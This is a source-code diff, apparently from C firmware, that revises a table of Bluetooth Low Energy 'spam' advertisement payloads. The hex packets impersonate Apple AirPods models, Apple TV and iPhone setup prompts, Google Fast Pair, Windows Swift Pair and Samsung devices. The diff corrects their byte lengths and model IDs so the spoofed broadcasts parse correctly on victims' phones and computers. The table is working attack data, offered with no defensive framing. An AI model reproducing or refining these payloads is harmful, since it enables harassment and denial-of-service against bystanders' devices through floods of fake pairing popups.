@@ -88,87 +88,82 @@
  */
 static const ble_spam_payload_t s_payloads[] =
 {
-    /* -------- Apple iOS: AirPods 1st gen (model 0x2002) -------- */
+    /* -------- Apple iOS: AirPods 1st gen (model 0x2002, LE=[02,20]) -------- */
     {
         "Apple AirPods",
-        /* 02 01 1A                    Flags
-         * 1E FF 4C 00                 Apple manufacturer (len=30)
-         *    07 19                    Type=Proximity Pair, len=25
-         *    10 02 20 00 00 00 ...   Status, model=0x2002, 20 zero bytes
+        /* No Flags prefix — this payload fills all 31 bytes exactly.
+         * 1E FF 4C 00  = Mfr specific: length=30, type=0xFF, Apple (0x004C)
+         * 07 19        = type=Proximity Pairing, inner_len=25
+         * 10 02 20     = status=new(0x10), model=[0x02,0x20]=0x2002 AirPods gen1
+         * 00×22        = encrypted zeros (22 bytes)
          */
-        "02011A"
-        "1EFF4C0007191002200000000000000000000000000000000000000001"
+        "1EFF4C000719100220"
+        "00000000000000000000000000000000000000000000"
     },
 
-    /* -------- Apple iOS: AirPods Pro (model 0x200E) -------- */
+    /* -------- Apple iOS: AirPods Pro 1st gen (model 0x200E, LE=[0E,20]) -------- */
     {
         "Apple AirPods Pro",
-        "02011A"
-        "1EFF4C00071910200E00000000000000000000000000000000000000"
+        /* model=[0x0E,0x20]=0x200E */
+        "1EFF4C000719100E20"
+        "00000000000000000000000000000000000000000000"
     },
 
-    /* -------- Apple iOS: AirPods Max (model 0x200A) -------- */
+    /* -------- Apple iOS: AirPods Max (model 0x200A, LE=[0A,20]) -------- */
     {
         "Apple AirPods Max",
-        "02011A"
-        "1EFF4C0007191020020000000000000000000000000000000000000001"
+        /* model=[0x0A,0x20]=0x200A */
+        "1EFF4C000719100A20"
+        "00000000000000000000000000000000000000000000"
     },
 
     /* -------- Apple iOS: Apple TV Nearby Action (type=0x04, action=0x06) -------- */
     {
         "Apple TV Setup",
-        /* 02 01 1A
-         * 0B FF 4C 00    Apple (len=11)
-         *    04 06        Type=Nearby Action, action=AppleTV
-         *    00 00 00 00 00 00 00 00
+        /* 02 01 1A  = Flags
+         * 0B FF 4C 00 = Apple Mfr (len=11)
+         * 04 06     = type=Nearby Action, action=0x06 (AppleTV)
+         * 00 × 8    = padding
          */
-        "02011A"
-        "0BFF4C00040600000000000000"
+        "02011A0BFF4C00040600000000000000"
     },
 
     /* -------- Apple iOS: iPhone setup (Nearby Action 0x05) -------- */
     {
         "Apple iPhone Setup",
-        "02011A"
-        "0BFF4C000405000000000000"
+        "02011A0BFF4C000405000000000000"
     },
 
     /* -------- Google Fast Pair / Android (model 0xF52494 = generic headphones) -------- */
     {
         "Android Fast Pair",
         /* 02 01 1A         Flags
-         * 03 03 2C FE      Complete 16-bit UUID: 0xFE2C (Fast Pair)
-         * 06 16 2C FE      Service Data UUID 0xFE2C (len=6)
-         *    F5 24 94       Fast Pair model ID
-         *    00 00 00       padding
+         * 03 03 2C FE      Complete 16-bit UUID: 0xFE2C (Fast Pair, LE)
+         * 05 16 2C FE      Service Data UUID 0xFE2C (len=5: type+uuid+model)
+         *    F5 24 94       Fast Pair model ID (3 bytes)
          */
-        "02011A"
-        "03032CFE"
-        "0616FE2CF5249400000000"
+        "02011A03032CFE05162CFEF52494"
     },
 
     /* -------- Windows Swift Pair (Microsoft, Company ID 0x0006) -------- */
     {
         "Windows Swift Pair",
-        /* 02 01 06         Flags (general discoverable)
-         * 09 FF 06 00      Microsoft company (len=9)
+        /* 02 01 06         Flags
+         * 0A FF 06 00      Microsoft company (len=10)
          *    03             Subtype = Swift Pair
-         *    00             Reserved
-         *    XX XX XX XX XX XX  Padding / beacon data
+         *    00 × 7         Reserved padding
          */
-        "020106"
-        "09FF060003000000000000"
+        "0201060AFF060003000000000000"
     },
 
     /* -------- Samsung Galaxy Fast Pair (Company ID 0x0075) -------- */
     {
         "Samsung Galaxy",
         /* 02 01 06
-         * 0B FF 75 00      Samsung company (len=11)
-         *    42 09 81 ...   Samsung Fast Pair TLV data
+         * 0A FF 75 00      Samsung company (len=10)
+         *    42 09 81 00 01 00 00  Samsung Fast Pair TLV data
          */
-        "020106"
-        "0BFF75004209810001000000000000"
+        "0201060AFF750042098100010000"
     },
 };
 
